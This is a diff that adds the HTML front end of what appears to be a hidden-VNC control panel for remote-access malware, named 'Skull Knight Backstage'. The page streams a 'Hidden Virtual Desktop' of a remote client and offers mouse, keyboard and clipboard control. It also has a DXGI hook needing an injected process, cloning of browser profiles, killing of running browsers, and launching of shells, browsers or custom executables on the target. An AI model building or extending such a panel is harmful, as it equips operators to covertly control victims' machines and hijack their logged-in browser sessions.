@@ -1,0 +1,305 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Skull Knight Backstage</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/assets/tailwind.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <link rel="stylesheet" href="/assets/console.css" />
+    <script defer src="/assets/logout.js"></script>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+
+    <main class="px-5 py-6 flex-1 flex flex-col">
+      <div class="flex-1 flex flex-col gap-4" style="max-width: 100%">
+        <div class="flex flex-wrap gap-3 items-center">
+          <div
+            class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-3"
+          >
+            <label class="text-sm text-slate-300" for="displaySelect"
+              >Display</label
+            >
+            <select
+              id="displaySelect"
+              class="bg-slate-800 border border-slate-700 rounded px-2 py-1 text-slate-100"
+            ></select>
+            <button id="refreshDisplays" class="button ghost">
+              <i class="fa-solid fa-rotate"></i><span>Refresh</span>
+            </button>
+          </div>
+          <div
+            class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-3 text-sm text-slate-300"
+          >
+            <label for="qualitySlider" class="text-slate-200">Quality</label>
+            <input
+              id="qualitySlider"
+              type="range"
+              min="10"
+              max="100"
+              step="5"
+              value="90"
+              class="accent-violet-400"
+            />
+            <span id="qualityValue" class="pill pill-ghost text-slate-100"
+              >95%</span
+            >
+          </div>
+          <div
+            class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-3 text-sm text-slate-300"
+          >
+            <label class="flex items-center gap-2 text-slate-200" title="Prefer H.264 when available; disable to force JPEG">
+              <input type="checkbox" id="codecH264" checked /> H.264
+            </label>
+            <span id="codecMode" class="pill pill-ghost text-slate-100">Codec: auto</span>
+          </div>
+          <div class="flex items-center gap-2">
+            <button id="startBtn" class="button primary">
+              <i class="fa-solid fa-play"></i><span>Start</span>
+            </button>
+            <button id="stopBtn" class="button ghost">
+              <i class="fa-solid fa-stop"></i><span>Stop</span>
+            </button>
+            <button id="commandsBtn" class="button ghost">
+              <i class="fa-solid fa-terminal"></i><span>Commands</span>
+            </button>
+            <button id="fullscreenBtn" class="button ghost">
+              <i class="fa-solid fa-expand"></i><span>Fullscreen</span>
+            </button>
+          </div>
+          <div
+            id="streamStatus"
+            class="inline-flex items-center gap-2 px-3 py-2 rounded-full bg-slate-800 text-slate-300 border border-slate-700 text-sm"
+          >
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+            <span>Connecting</span>
+          </div>
+          <div
+            id="cloneProgress"
+            class="hidden items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm text-slate-300"
+          >
+            <i class="fa-solid fa-clone text-violet-400"></i>
+            <span id="cloneProgressLabel">Cloning profile…</span>
+            <div class="w-32 h-2 bg-slate-700 rounded-full overflow-hidden">
+              <div id="cloneProgressBar" class="h-full bg-violet-500 rounded-full transition-all duration-200" style="width: 0%"></div>
+            </div>
+            <span id="cloneProgressPct" class="pill pill-ghost font-mono text-violet-200 min-w-[3ch] text-right">0%</span>
+          </div>
+          <div
+            id="dxgiStatus"
+            class="hidden items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm"
+          >
+            <i id="dxgiStatusIcon" class="fa-solid fa-microchip text-emerald-400"></i>
+            <span id="dxgiStatusLabel">DXGI</span>
+          </div>
+          <div
+            class="flex items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm text-slate-300"
+          >
+            <span class="uppercase tracking-wide text-xs text-slate-500"
+              >fps</span
+            >
+            <span
+              id="agentFps"
+              class="pill pill-ghost font-mono text-violet-200"
+              >--</span
+            >
+            <span class="text-slate-600">→</span>
+            <span id="viewerFps" class="pill pill-ghost font-mono text-sky-200"
+              >--</span
+            >
+            <span class="text-slate-600">|</span>
+            <span class="uppercase tracking-wide text-xs text-slate-500">lat</span>
+            <span id="latencyDisplay" class="pill pill-ghost font-mono text-amber-200">--</span>
+          </div>
+          <div
+            class="flex items-center gap-4 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2"
+          >
+            <label class="flex items-center gap-2 text-sm text-slate-200"
+              ><input type="checkbox" id="mouseCtrl" /> Mouse</label
+            >
+            <label class="flex items-center gap-2 text-sm text-slate-200"
+              ><input type="checkbox" id="kbdCtrl" /> Keyboard</label
+            >
+            <label class="flex items-center gap-2 text-sm text-slate-200" title="Sync clipboard between your browser and the remote machine"
+              ><input type="checkbox" id="clipboardSyncCtrl" /> Clipboard Sync</label
+            >
+            <label class="flex items-center gap-2 text-sm text-slate-200" title="Use DXGI Present hook for faster capture (requires injected process)"
+              ><input type="checkbox" id="dxgiCtrl" checked /> DXGI Capture</label
+            >
+            <label for="hvncResolutionSelect" class="text-sm text-slate-200">Resolution</label>
+            <select
+              id="hvncResolutionSelect"
+              class="bg-slate-800 border border-slate-700 rounded px-2 py-1 text-slate-100 text-sm"
+            >
+              <option value="720">720p</option>
+              <option value="1080" selected>1080p</option>
+              <option value="1440">1440p</option>
+              <option value="-1">Native</option>
+            </select>
+
+          </div>
+        </div>
+
+        <div
+          id="canvasContainer"
+          class="flex-1 rounded-xl border border-violet-800/50 bg-slate-900/70 shadow-lg overflow-hidden flex flex-col"
+          style="min-height: 500px"
+        >
+          <div class="p-3 text-sm text-slate-400 flex-shrink-0 flex items-center gap-2">
+            <i class="fa-solid fa-ghost text-violet-400"></i>
+            <span>Hidden Virtual Desktop - Client: <span id="clientLabel" class="text-slate-100">-</span></span>
+          </div>
+          <div
+            class="flex-1 flex items-center justify-center p-4"
+            style="min-height: 0; overflow: hidden"
+          >
+            <canvas
+              id="frameCanvas"
+              class="bg-slate-950"
+              width="1280"
+              height="720"
+              style="
+                display: block;
+                max-width: 100%;
+                max-height: 100%;
+                width: auto;
+                height: auto;
+              "
+            ></canvas>
+          </div>
+        </div>
+        <div
+          id="hvncContextMenu"
+          class="hidden fixed z-50 min-w-[220px] max-h-[80vh] overflow-y-auto rounded-lg border border-slate-700 bg-slate-900/95 text-sm text-slate-200 shadow-xl"
+        >
+          <!-- Options -->
+          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Options</div>
+          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
+            <input type="checkbox" id="hvncCloneToggle" checked class="accent-violet-500 w-4 h-4 rounded" />
+            <span class="text-xs text-slate-300">Clone profile</span>
+          </label>
+          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
+            <input type="checkbox" id="hvncCloneLiteToggle" class="accent-violet-500 w-4 h-4 rounded" />
+            <span class="text-xs text-slate-300">Lite clone (no extensions)</span>
+          </label>
+          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
+            <input type="checkbox" id="hvncKillIfRunningToggle" class="accent-violet-500 w-4 h-4 rounded" />
+            <span class="text-xs text-slate-300">Kill browser if running</span>
+          </label>
+          <div class="my-1 border-t border-slate-700/60"></div>
+          <!-- Shells -->
+          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Shells</div>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-cmd">
+            <i class="fa-solid fa-terminal mr-2 text-violet-300"></i>cmd.exe
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-powershell">
+            <i class="fa-solid fa-bolt mr-2 text-sky-300"></i>powershell.exe
+          </button>
+          <div class="my-1 border-t border-slate-700/60"></div>
+          <!-- Chromium Browsers -->
+          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Chromium</div>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-chrome" data-browser="chrome">
+            <i class="fa-brands fa-chrome mr-2 text-emerald-300"></i>Chrome
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-brave" data-browser="brave">
+            <i class="fa-brands fa-brave mr-2 text-amber-300"></i>Brave
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-edge" data-browser="edge">
+            <i class="fa-brands fa-edge mr-2 text-sky-300"></i>Edge
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-opera" data-browser="opera">
+            <i class="fa-brands fa-opera mr-2 text-red-400"></i>Opera
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-operagx" data-browser="operagx">
+            <i class="fa-brands fa-opera mr-2 text-fuchsia-400"></i>Opera GX
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-vivaldi" data-browser="vivaldi">
+            <i class="fa-solid fa-globe mr-2 text-rose-300"></i>Vivaldi
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-yandex" data-browser="yandex">
+            <i class="fa-brands fa-yandex-international mr-2 text-yellow-300"></i>Yandex
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-arc" data-browser="arc">
+            <i class="fa-solid fa-globe mr-2 text-blue-300"></i>Arc
+          </button>
+          <div class="my-1 border-t border-slate-700/60"></div>
+          <!-- Firefox Browsers -->
+          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Firefox</div>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-firefox" data-browser="firefox">
+            <i class="fa-brands fa-firefox mr-2 text-orange-300"></i>Firefox
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-waterfox" data-browser="waterfox">
+            <i class="fa-brands fa-firefox mr-2 text-cyan-300"></i>Waterfox
+          </button>
+          <div class="my-1 border-t border-slate-700/60"></div>
+          <!-- Custom -->
+          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Custom</div>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-custom">
+            <i class="fa-solid fa-file mr-2 text-slate-300"></i>Run custom exe…
+          </button>
+          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="lookup-exe">
+            <i class="fa-solid fa-magnifying-glass mr-2 text-amber-300"></i>Lookup exe…
+          </button>
+        </div>
+        <style>
+          body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+          }
+          #canvasContainer[data-stream-state="streaming"] {
+            border-color: rgba(139, 92, 246, 0.7);
+            box-shadow: 0 0 0 1px rgba(139, 92, 246, 0.45);
+          }
+          #canvasContainer[data-stream-state="stalled"] {
+            border-color: rgba(251, 146, 60, 0.7);
+            box-shadow: 0 0 0 1px rgba(251, 146, 60, 0.45);
+          }
+          #canvasContainer:fullscreen {
+            display: flex;
+            flex-direction: column;
+            background: #000;
+          }
+          #canvasContainer:fullscreen #frameCanvas {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            margin: auto;
+          }
+          #hvncContextMenu.hidden {
+            display: none;
+          }
+          #hvncContextMenu button.browser-unavailable {
+            opacity: 0.35;
+            pointer-events: none;
+            cursor: default;
+          }
+          #hvncContextMenu button.browser-unavailable::after {
+            content: " (not found)";
+            font-size: 0.65rem;
+            color: #94a3b8;
+          }
+        </style>
+      </div>
+    </main>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/msgpackr@1.11.8/dist/index.js"></script>
+    <script type="module" src="/assets/nav.js"></script>
+    <script type="module" src="/assets/hvnc.js"></script>
+  </body>
+</html>
